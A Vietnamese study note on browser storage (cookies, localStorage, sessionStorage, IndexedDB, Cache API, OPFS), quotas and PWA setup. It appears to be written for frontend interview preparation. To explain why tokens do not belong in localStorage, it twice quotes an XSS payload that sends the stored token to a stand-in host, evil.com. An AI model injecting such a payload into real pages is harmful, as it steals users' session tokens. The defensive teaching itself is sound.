# Storage & PWA — Cookie vs localStorage vs IndexedDB vs sessionStorage, Quota, PWA (Manifest + Service Worker + HTTPS)

> Tags: #storage #cookie #localStorage #sessionStorage #indexedDB #cache-api #opfs #quota #pwa #manifest #service-worker | Nguồn: `docs/06-browser-web-platform.md` câu 112, 118-120 + `docs/05-performance.md` câu 98-99 | Mức: P0

## 1. Định nghĩa chính xác

**Cookie** là storage 4KB/cookie (~20 cookie/domain) được **tự động gửi kèm mọi request** cùng domain/path, lifecycle theo `Expires`/`Max-Age`, scope per domain+path, bảo mật bằng `HttpOnly` (chặn JS đọc), `Secure` (chỉ HTTPS), `SameSite` (chặn CSRF). Dùng cho **auth/session/tracking**.

**localStorage** là **đồng bộ**, **per origin**, **5-10MB**, **persist vĩnh viễn** tới khi xóa, **không gửi kèm request**, **block main thread** khi đọc/ghi, **XSS đọc được** nên không lưu token nhạy cảm.

**sessionStorage**: như localStorage nhưng **per tab** (per `Window`), **xóa khi đóng tab**.

**IndexedDB** là DB NoSQL **bất đồng bộ** (transaction, object store, index, cursor), **GB** (tới ~60% disk, theo `navigator.storage.estimate()`), lưu structured object, không block main thread. Dùng cho **offline data, cache API lớn, draft, file**.

**PWA (Progressive Web App)** là web app **installable, offline, push** mà không qua app store, yêu cầu **HTTPS + Web App Manifest + Service Worker**.

**Quota API**: `navigator.storage.estimate()` trả `{ quota, usage }`; vượt quota ném `QuotaExceededError` (localStorage) hoặc `AbortError` (IndexedDB).

## 2. Cơ chế hoạt động

### 2.1 Cookie

```
Set-Cookie: session=abc123; Path=/; Max-Age=3600; HttpOnly; Secure; SameSite=Lax; Domain=example.com
```

- **Auto-send**: browser tự gắn `Cookie: session=abc123` vào mọi `fetch`/`XHR`/`navigation` tới `example.com`. Tốn bandwidth mỗi request (vài KB × 30 request = overhead).
- **Scope**: `Domain` (share subdomain nếu `.example.com`), `Path` (`/api` chỉ gửi cho `/api/*`), `SameSite`:
  - `Strict`: không gửi cross-site (kể cả top-level navigate, như click link từ `evil.com`).
  - `Lax`: gửi cho top-level GET navigate (link), không gửi cho POST/iframe/fetch cross-site — **cân bằng, mặc định hiện nay**.
  - `None`: gửi mọi cross-site, **bắt buộc `Secure`**.
- **HttpOnly**: JS `document.cookie` không đọc được → chặn XSS đánh cắp.
- **Secure**: chỉ gửi qua HTTPS.
- **Lifecycle**: `Max-Age` (giây) thắng `Expires` (date). Không set → session cookie (xóa khi đóng browser). `Max-Age=0` → xóa.
- **Giới hạn**: 4KB/cookie, ~20 cookie/domain (~80KB total). Quá → `Set-Cookie` bị drop.

### 2.2 localStorage vs sessionStorage

- **Sync**: `getItem`/`setItem` block main thread (stringify/parse + I/O). Ghi 5MB JSON lớn → INP tăng.
- **Scope**: localStorage per origin, share giữa tab (cùng origin thấy nhau). sessionStorage per tab — tab mới không thấy.
- **Event**: `window.addEventListener('storage', e => ...)` fire **ở tab khác** khi localStorage đổi (không fire ở tab ghi), dùng để sync theme/logout cross-tab.
- **Chỉ string**: `setItem('draft', JSON.stringify(obj))`, cần `try/catch` `QuotaExceededError`.

### 2.3 IndexedDB

- **Async**: mọi thao tác qua `transaction` + `request.onsuccess`, không block. Dùng wrapper `idb` (`openDB`) thay vì API gốc verbose.
- **Structure**: `database → objectStore (keyPath) → index → cursor`. Lưu `Blob`, `ArrayBuffer`, object.
- **Quota**: `navigator.storage.estimate()` → `quota` (~60% disk), `usage`. `navigator.storage.persist()` xin **persistent storage** (không bị evict khi disk đầy, cần user grant).
- **Eviction**: nếu không `persist`, browser có thể xóa khi disk áp lực (theo LRU, origin ít dùng trước).

### 2.4 Cache API vs OPFS

- **Cache API**: `caches.open('v1').put(Request, Response)` — chỉ cho `Request/Response`, dùng bởi SW, GB.
- **OPFS (Origin Private File System)**: `navigator.storage.getDirectory()` → `FileSystemHandle`, sync trong Worker, cho file lớn/WASM/SQLite.

### 2.5 PWA — 3 trụ cột

1. **HTTPS**: SW chỉ chạy trên secure context (trừ `localhost`).
2. **Web App Manifest** (`manifest.json`): `name`, `short_name`, `icons` (192/512, `any maskable`), `start_url`, `display` (`standalone`/`minimal-ui`/`browser`), `theme_color`, `background_color`, `shortcuts`.
3. **Service Worker**: lifecycle `register → install (precache, skipWaiting) → activate (xóa cache cũ, clients.claim) → fetch (intercept)`. Cho offline (`offline.html` fallback), `stale-while-revalidate`, push, background sync.

Installability (Chrome): manifest + SW + HTTPS + `beforeinstallprompt` event; Lighthouse check `144×144` icon, `start_url` load offline.

## 3. Ví dụ tối thiểu

```js
// 3.1 Cookie — server set HttpOnly cho auth, JS set cho theme
// Server (Express)
res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/');
// JS (chỉ cookie không HttpOnly)
document.cookie = 'theme=dark; Max-Age=31536000; Path=/; SameSite=Lax; Secure';
console.log(document.cookie); // "theme=dark" — không thấy session vì HttpOnly

// Xóa
document.cookie = 'theme=; Max-Age=0; Path=/';

// 3.2 localStorage — sync, persist, cross-tab
try {
  localStorage.setItem('draft', JSON.stringify({ title: 'hello', body: '...' }));
  const draft = JSON.parse(localStorage.getItem('draft') ?? 'null');
} catch (e) {
  if (e.name === 'QuotaExceededError') console.error('localStorage full 5MB');
}
localStorage.removeItem('draft');

// Cross-tab sync
window.addEventListener('storage', (e) => {
  if (e.key === 'theme') console.log('theme changed in other tab', e.newValue);
});

// ❌ Không lưu token nhạy cảm — XSS đọc được
// localStorage.setItem('token', jwt); // XSS: <img onerror="fetch('https://evil.com?c='+localStorage.token)">
// ✅ Cookie HttpOnly + SameSite cho token, memory cho access token

// 3.3 sessionStorage — per tab
sessionStorage.setItem('tabId', crypto.randomUUID());
// Tab mới: sessionStorage.getItem('tabId') === null
// Đóng tab: mất

// 3.4 IndexedDB — async, GB, structured (dùng idb wrapper)
import { openDB } from 'idb';

const db = await openDB('my-db', 1, {
  upgrade(db) {
    const store = db.createObjectStore('products', { keyPath: 'id' });
    store.createIndex('by-price', 'price');
    db.createObjectStore('drafts', { keyPath: 'id' });
  },
});
await db.put('products', { id: '1', name: 'Shoes', price: 100 });
const p = await db.get('products', '1');         // async, không block
const all = await db.getAll('products');
const byPrice = await db.getAllFromIndex('products', 'by-price');
await db.delete('products', '1');

// Quota
const { quota, usage } = await navigator.storage.estimate();
console.log(`Used ${usage} / ${quota} bytes`);
if (await navigator.storage.persist()) console.log('Persistent granted — không bị evict');

// 3.5 Cache API (cho SW)
const cache = await caches.open('api-cache-v1');
await cache.put('/api/products', new Response(JSON.stringify(products), { headers: { 'Content-Type': 'application/json' } }));
const cached = await cache.match('/api/products');

// 3.6 OPFS — file lớn
const root = await navigator.storage.getDirectory();
const fh = await root.getFileHandle('video.mp4', { create: true });
const writable = await fh.createWritable();
await writable.write(blob);
await writable.close();
```

```json
// 3.7 PWA Manifest
{
  "name": "My Shop",
  "short_name": "Shop",
  "start_url": "/?source=pwa",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#0066ff",
  "icons": [
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "any maskable" }
  ],
  "shortcuts": [{ "name": "Cart", "url": "/cart", "icons": [{ "src": "/cart.png", "sizes": "96x96" }] }]
}
```

```html
<!-- 3.8 Register SW + install prompt -->
<link rel="manifest" href="/manifest.json" />
<meta name="theme-color" content="#0066ff" />
<script>
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js', { scope: '/' }).then(reg => {
    reg.addEventListener('updatefound', () => console.log('new SW installing'));
  });
}
let deferredPrompt;
window.addEventListener('beforeinstallprompt', e => {
  e.preventDefault(); deferredPrompt = e; showInstallButton();
});
installButton.addEventListener('click', async () => {
  deferredPrompt.prompt();
  const { outcome } = await deferredPrompt.userChoice; // accepted | dismissed
  console.log(outcome);
});
</script>
```

```js
// 3.9 sw.js — precache + offline fallback
const CACHE = 'v2';
self.addEventListener('install', e => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(['/offline.html', '/app.js', '/hero.jpg'])).then(() => self.skipWaiting()));
});
self.addEventListener('activate', e => {
  e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))).then(() => self.clients.claim()));
});
self.addEventListener('fetch', e => {
  e.respondWith(caches.match(e.request).then(cached => cached ?? fetch(e.request).catch(() => caches.match('/offline.html'))));
});
```

## 4. So sánh / Phân loại

| Tiêu chí | Cookie | localStorage | sessionStorage | IndexedDB | Cache API |
|----------|--------|--------------|----------------|-----------|-----------|
| Dung lượng | 4KB/cookie, ~20/domain | 5-10MB | 5-10MB | GB (~60% disk) | GB |
| Gửi kèm request | **Có** (auto) | Không | Không | Không | Không |
| Lifecycle | `Max-Age`/`Expires` hoặc session | Vĩnh viễn tới khi xóa | Per tab, xóa khi đóng tab | Persist, có thể evict nếu không `persist()` | SW lifecycle |
| Scope | Per domain+path, share tab | Per origin, share tab | Per origin+per tab | Per origin | Per origin |
| Đồng bộ | Đồng bộ | **Đồng bộ (block)** | **Đồng bộ (block)** | **Bất đồng bộ** | **Bất đồng bộ** |
| API | `document.cookie` / `Set-Cookie` | `getItem`/`setItem` (string) | `getItem`/`setItem` | `openDB`/`transaction` | `caches.open().match/put` |
| XSS risk | `HttpOnly` chặn | Đọc được | Đọc được | Đọc được (nhưng structured) | — |

| Cookie `SameSite` | Gửi khi | CSRF bảo vệ | Dùng khi |
|-------------------|---------|-------------|----------|
| `Strict` | Chỉ same-site | Cao nhất | Bank, auth nhạy cảm (nhưng break OAuth redirect) |
| `Lax` (default) | Top-level GET navigate | Cao | Mặc định — cân bằng |
| `None` | Mọi cross-site | Không (cần CSRF token) | Embed cross-site, **bắt buộc `Secure`** |

| PWA | Native wrapper (Capacitor/Tauri) |
|-----|----------------------------------|
| Web — install qua browser, không app store, update tức thì | Native — qua store, cần build binary |
| Không truy cập Bluetooth/NFC/background nặng | Có |
| Cost thấp 10×, 1 codebase | Cost cao, native plugin |
| iOS support kém hơn Android (push từ 16.4) | Full native |

| Storage | Khi dùng |
|---------|----------|
| Cookie HttpOnly | Auth token, session (chống XSS) |
| localStorage | Theme, draft nhỏ, cache UI (không nhạy cảm) |
| sessionStorage | Tab ID, wizard state per tab |
| IndexedDB | Offline data, large cache, draft lớn, queue |
| Cache API | HTTP response cho SW offline |
| OPFS | File/WASM/SQLite lớn |

## 5. Trade-off / Khi nào KHÔNG dùng

- **Không lưu JWT trong localStorage**: `localStorage.getItem('token')` đọc được bằng XSS (`<img onerror="fetch('https://evil.com?c='+localStorage.token)">`). Dùng **Cookie `HttpOnly`+`Secure`+`SameSite`** cho refresh token, **memory** (`let token` trong closure) + `refresh` rotation cho access token. Hoặc `SameSite=Strict` + CSRF token.
- **Không dùng localStorage cho data lớn/nhanh**: 5MB + sync block → INP tệ khi `JSON.parse` 2MB trong render. Dùng IndexedDB async.
- **Không dùng Cookie cho data lớn**: 4KB/cookie, mỗi request kèm → tốn bandwidth (analytics cookie 2KB × 30 request = 60KB overhead). Dùng localStorage/IndexedDB và gửi qua header khi cần.
- **Không quên `SameSite` cho cookie auth**: không set → browser default `Lax` (từ 2020), nhưng `None` cũ vẫn `Secure`. Luôn set explicit `SameSite=Lax` hoặc `Strict`.
- **Không PWA khi cần native capability**: Bluetooth, NFC, background fetch nặng, App Store presence → dùng Capacitor/Tauri. PWA cho 80% use case content/app nhẹ.
- **Không SW cache bừa bãi**: SW thêm complexity (update phải `skipWaiting`+`clients.claim`, `sw.js` phải `Cache-Control: no-cache` nếu không kẹt 24h), chỉ HTTPS. Dùng Workbox thay vì tự code.
- **Không `WeakMap` khi cần duyệt**: `WeakMap` không `size`/iterate, không leak nhưng không thay `Map` cache cần `clear`.

## 6. Failure modes & Cách đo / Debug

- **Lỗi 1: XSS đánh cắp token trong localStorage**
  - Triệu chứng: `localStorage.getItem('token')` gửi tới `evil.com`.
  - Fix: chuyển sang `HttpOnly` cookie; React ` {userInput}` auto-escape, không `dangerouslySetInnerHTML` với user input; CSP `script-src 'self'`.
  - Đo: DevTools Application → Local Storage; `npm audit`, CSP `report-uri`.

- **Lỗi 2: Cookie vượt 4KB bị drop im lặng**
  - Triệu chứng: `Set-Cookie` không lưu, auth mất sau khi thêm data vào cookie.
  - Fix: chỉ lưu ID/token, data lớn sang localStorage/IndexedDB; check `document.cookie.length`.
  - Đo: Application → Cookies, Network → `Set-Cookie` response header, `document.cookie`.

- **Lỗi 3: `QuotaExceededError` localStorage 5MB**
  - Triệu chứng: `setItem` ném `QuotaExceededError`, app crash khi cache API response lớn.
  - Fix: `try/catch`, chuyển sang IndexedDB, `LZString.compress`, evict cũ.
  - Đo: `navigator.storage.estimate()`; `localStorage.length`; try/catch.

- **Lỗi 4: IndexedDB API gốc verbose, quên transaction**
  - Triệu chứng: `TransactionInactiveError`, data không ghi.
  - Fix: dùng `idb` wrapper (`openDB`, `put`, `get`), await đúng.
  - Đo: Application → IndexedDB, `chrome://indexeddb-internals`.

- **Lỗi 5: PWA không installable**
  - Triệu chứng: không có "Add to Home Screen", Lighthouse PWA fail.
  - Nguyên nhân: thiếu `manifest.json` link, icon 192/512, `start_url` offline, SW không `fetch`, không HTTPS.
  - Fix: thêm manifest, SW `fetch` handler, HTTPS, `beforeinstallprompt`.
  - Đo: DevTools Application → Manifest, Service Workers, Lighthouse → PWA audit.

- **Lỗi 6: SW kẹt cũ sau deploy**
  - Triệu chứng: user thấy `v1` dù deploy `v2`, phải hard reload.
  - Nguyên nhân: `sw.js` bị cache 24h nếu không `Cache-Control: no-cache`; không `skipWaiting`.
  - Fix: server `Cache-Control: no-cache` cho `sw.js`; `install` → `skipWaiting()`, `activate` → `clients.claim()` + xóa cache cũ.
  - Đo: Application → Service Workers → `Update`, `Bypass for network`.

- **Lỗi 7: Storage bị evict khi disk đầy**
  - Triệu chứng: IndexedDB data mất sau khi disk gần đầy.
  - Fix: `navigator.storage.persist()` xin persistent; fallback fetch lại.
  - Đo: `navigator.storage.estimate()`, `navigator.storage.persisted()`.

- **Công cụ**:
  - **Application tab**: Cookies, Local Storage, Session Storage, IndexedDB, Cache Storage, Manifest, Service Workers, Storage estimate.
  - **Lighthouse**: PWA, "Ensure text remains visible" (font), Performance.
  - **`navigator.storage.estimate()`**: quota/usage.

## 7. Câu hỏi tự kiểm tra

1. Phân biệt Cookie (4KB, auto-send, `HttpOnly`/`Secure`/`SameSite`, per domain) vs localStorage (5MB sync per origin) vs sessionStorage (per tab) vs IndexedDB (async GB) — khi nào lưu auth token ở đâu và vì sao không lưu JWT trong localStorage?
2. `SameSite=Lax` vs `Strict` vs `None` khác gì về CSRF và OAuth redirect, và `HttpOnly` + `Secure` chặn XSS thế nào?
3. PWA cần gì để installable (manifest + SW + HTTPS) và SW lifecycle `install`/`activate`/`fetch` với `skipWaiting`/`clients.claim` hoạt động thế nào? Vượt quota localStorage/IndexedDB thì sao?

<details>
<summary>Đáp án 30s</summary>

1. **Cookie** 4KB/cookie, auto-send mỗi request, dùng `HttpOnly` chặn JS đọc (chống XSS) + `Secure` + `SameSite` → cho **auth/session**. **localStorage** 5MB sync, per origin, không gửi, block main thread → cho **theme/draft nhỏ không nhạy cảm**; XSS đọc được nên **không lưu JWT** (bị `<img onerror>` đánh cắp). **sessionStorage** như localStorage nhưng per tab, xóa khi đóng tab → tab ID. **IndexedDB** async, transaction, index, GB → **offline data, cache lớn, queue**; không block. Quá quota: localStorage `QuotaExceededError`, IndexedDB `AbortError`.

2. `SameSite=Strict`: không gửi cross-site kể cả top-level GET → chặn CSRF triệt để nhưng break OAuth redirect (từ `auth.example.com` về `app.com` mất cookie). `Lax`: gửi cho top-level GET navigate (link), không gửi POST/iframe/fetch cross-site — cân bằng, default. `None`: gửi mọi cross-site, bắt buộc `Secure` + CSRF token. `HttpOnly` chặn `document.cookie` đọc → XSS không lấy được session; `Secure` chỉ gửi qua HTTPS → chống sniff.

3. **PWA**: HTTPS (SW chỉ secure context) + `manifest.json` (name, icons 192/512, start_url, display) + **Service Worker** intercept `fetch`. Lifecycle: `register` → `install` (precache `caches.open().addAll`, `skipWaiting()` để activate ngay không đợi tab đóng) → `activate` (xóa cache cũ, `clients.claim()` control ngay) → `fetch` (`respondWith(caches.match || fetch)`). Update: browser check `sw.js` mỗi navigation, nếu byte khác thì install new, đợi `skipWaiting` hoặc close tab. Quota: `navigator.storage.estimate()` check `quota/usage`; `persist()` xin không bị evict.

</details>

---
*Tham khảo chi tiết: `docs/06-browser-web-platform.md` — Câu 112, 118, 119, 120. Spec: [MDN — Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), [MDN — IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API), [web.dev — PWA](https://web.dev/articles/pwa-checklist).*
